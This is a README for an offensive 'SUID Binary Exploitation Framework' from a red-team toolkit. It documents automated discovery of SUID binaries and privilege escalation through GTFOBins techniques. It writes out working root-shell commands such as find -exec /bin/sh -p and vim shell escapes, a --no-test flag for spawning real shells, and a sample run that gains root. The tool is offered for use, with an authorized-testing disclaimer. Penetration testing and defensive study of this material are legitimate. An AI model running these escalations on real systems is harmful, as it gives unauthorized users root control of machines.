# RT SUID Binary Exploitation Framework

> **Part of the 30 Days of Red Team Toolkit**

A modular framework for discovering and exploiting SUID binaries using GTFOBins techniques.

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     SUID Binary Exploitation Framework                        â•‘
â•‘     "Find SUID. Exploit SUID. Own the box."                   â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

## ğŸ¯ Features

- **Comprehensive GTFOBins Database**: 50+ binaries with exploitation techniques
- **Automatic SUID Discovery**: Finds all SUID binaries on the system
- **Smart Categorization**: Exploitable, Unusual, and Standard binaries
- **Automated Exploitation**: Tests each technique automatically
- **Safe Test Mode**: Runs `id` command instead of spawning shells
- **Detailed Reports**: JSON reports and exploitation guides

## ğŸ“¦ Installation

```bash
# Clone or copy the rt_suid_exploiter directory
cd /path/to/toolkit

# Run directly
python3 -m rt_suid_exploiter

# Or import in your scripts
from rt_suid_exploiter import SUIDExploiter
```

## ğŸš€ Quick Start

### Command Line

```bash
# Auto-scan and exploit (safe test mode)
python3 -m rt_suid_exploiter

# Scan only - no exploitation
python3 -m rt_suid_exploiter --scan

# Exploit specific binary
python3 -m rt_suid_exploiter --exploit find
python3 -m rt_suid_exploiter --exploit vim --path /usr/bin/vim

# List techniques for a binary
python3 -m rt_suid_exploiter --list python

# List all known GTFOBins binaries
python3 -m rt_suid_exploiter --all-binaries

# Spawn actual shell (not test mode)
python3 -m rt_suid_exploiter --exploit find --no-test
```

### Python API

```python
from rt_suid_exploiter import SUIDExploiter

# Initialize
exploiter = SUIDExploiter()

# Scan only
result = exploiter.scan()

# Scan and exploit
result = exploiter.scan_and_exploit()

# Exploit specific binary
result = exploiter.exploit_specific('find')

# Save reports
exploiter.save_report(result)
exploiter.generate_exploit_guide(result)

# List techniques
exploiter.list_techniques('vim')
```

## ğŸ“Š Output

After running, you'll get:

```
/tmp/suid_exploit/
â”œâ”€â”€ suid_report.json     # Full JSON report
â””â”€â”€ exploit_guide.txt    # Quick reference for manual exploitation
```

### Sample Output

```
[+] Found 45 SUID binaries
[+] EXPLOITABLE: /usr/bin/find
[+] EXPLOITABLE: /usr/bin/vim.basic
[!] UNUSUAL: /opt/custom/backup

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
SUID SCAN SUMMARY
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Total SUID binaries: 45
  Exploitable (GTFOBins): 2
  Unusual (investigate): 1
  Standard (likely safe): 42

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
EXPLOITATION PHASE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[*] Attempting exploitation: find
[*] Path: /usr/bin/find
[*] Trying: Execute shell via -exec
[*] Test command: find . -exec id \; -quit
[*] Output: uid=0(root) gid=0(root) groups=0(root)

[+] SUCCESS! Achieved elevated privileges!
[*] To get an interactive shell, run:
    find . -exec /bin/sh -p \; -quit
```

## ğŸ”§ Supported Binaries

The framework includes exploitation techniques for 50+ binaries:

### Shells & Interpreters
`bash`, `sh`, `dash`, `zsh`, `csh`, `python`, `python3`, `perl`, `ruby`, `php`, `lua`, `node`, `tclsh`

### Text Editors
`vim`, `vi`, `nano`, `emacs`, `ed`

### File Viewers
`less`, `more`, `man`

### File Utilities
`find`, `cp`, `cat`, `dd`

### Text Processing
`awk`, `gawk`, `sed`

### Network Tools
`nmap`, `socat`, `wget`, `curl`

### Archive Utilities
`tar`, `zip`, `gzip`, `cpio`

### Misc
`env`, `xargs`, `time`, `timeout`, `strace`, `gdb`, `docker`, `screen`, `tmux`

## ğŸ“‹ Exploitation Techniques

Each binary has multiple exploitation techniques:

```python
# Example: find binary
techniques = [
    "find . -exec /bin/sh -p \\; -quit",      # Shell via -exec
    "find . -exec /bin/bash -p \\; -quit"     # Bash via -exec
]

# Example: vim binary
techniques = [
    "vim -c ':!/bin/sh'",                     # Shell escape
    "vim -c ':py3 import os; os.setuid(0)...' # Python setuid
    "vim -c ':set shell=/bin/sh' -c ':shell'" # Set shell
]
```

## âš ï¸ Safety Features

### Test Mode (Default)
By default, the framework runs `id` instead of spawning shells:

```bash
# This runs: find . -exec id \; -quit
# Instead of: find . -exec /bin/sh -p \; -quit
python3 -m rt_suid_exploiter
```

### Interactive Warning
For techniques requiring interactive terminals, the framework warns instead of hanging:

```
[!] Requires interactive shell
[*] Manual command: vim -c ':!/bin/sh'
```

## ğŸ—ï¸ Architecture

```
rt_suid_exploiter/
â”œâ”€â”€ __init__.py          # Package exports
â”œâ”€â”€ __main__.py          # CLI entry point
â”œâ”€â”€ core/
â”‚   â”œâ”€â”€ gtfobins.py      # GTFOBins database (50+ binaries)
â”‚   â”œâ”€â”€ binary.py        # Data structures
â”‚   â”œâ”€â”€ scanner.py       # SUID discovery
â”‚   â””â”€â”€ exploiter.py     # Main orchestrator
â””â”€â”€ README.md
```

## ğŸ” Understanding the Output

### Binary Categories

| Category | Meaning | Action |
|----------|---------|--------|
| **EXPLOITABLE** | Known GTFOBins binary | Exploit immediately |
| **UNUSUAL** | Non-standard SUID binary | Investigate manually |
| **STANDARD** | Common system binary | Usually not exploitable |

### Exploit Status

| Status | Meaning |
|--------|---------|
| `SUCCESS` | Root/elevated privileges achieved |
| `FAILED` | Technique did not work |
| `INTERACTIVE` | Requires manual execution |
| `ERROR` | Error during exploitation |

## ğŸ“š Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation
- [HackTricks SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid) - SUID exploitation guide

## âš ï¸ Legal Disclaimer

This tool is intended for **authorized security testing only**.

- Always obtain proper authorization before testing
- Use responsibly in controlled environments
- The authors are not responsible for misuse

---

**30 Days of Red Team** | *From Zero Access to Domain Admin*